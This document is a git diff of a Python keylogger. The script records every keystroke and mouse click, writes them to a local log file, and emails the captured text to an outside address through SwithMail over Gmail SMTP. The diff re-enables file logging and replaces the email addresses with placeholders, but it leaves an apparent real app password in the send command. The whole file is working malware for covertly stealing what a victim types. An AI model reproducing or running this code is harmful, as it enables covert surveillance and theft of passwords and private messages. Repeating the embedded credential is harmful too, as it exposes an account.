@@ -5,9 +5,8 @@ import os
 import pyautogui
 
 logkeys=''
-
 logkeys_limit = 100 
-#logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
  
 def on_press(key):
     logging.info(str(key))
@@ -46,22 +45,14 @@ def on_click(x, y, button, pressed):
             logkeys = ''
 def send_log():
     global logkeys
-    cmd = 'SwithMail.exe /s /from "mh1369080@gmail.com" /name "blas" /pass "khczysagbdifmzxj" /server "smtp.gmail.com" /p "587" /SSL /to "blas_lomibao@yahoo.com" /sub "logs" /b "' + logkeys + '"'
+    cmd = 'SwithMail.exe /s /from "haha@gmail.com" /name "name" /pass "khczysagbdifmzxj" /server "smtp.gmail.com" /p "587" /SSL /to "hoho@yahoo.com" /sub "logs" /b "' + logkeys + '"'
     os.system('cmd /c "'+ cmd + '"')
+     
 
-
-
-
-        
-#with putty.mouse.Listener(on_click=on_click) as mouse_listener :
-#    mouse_listener.join()
-#with putty.keyboard.Listener(on_press=on_press) as keyboard_listener :
-#    keyboard_listener.join()    
-# Setup the listener threads
 keyboard_listener = putty.keyboard.Listener(on_press=on_press)
 mouse_listener = putty.mouse.Listener(on_click=on_click)
 
-# Start the threads and join them so the script doesn't end early
+
 keyboard_listener.start()
 mouse_listener.start()
 keyboard_listener.join()
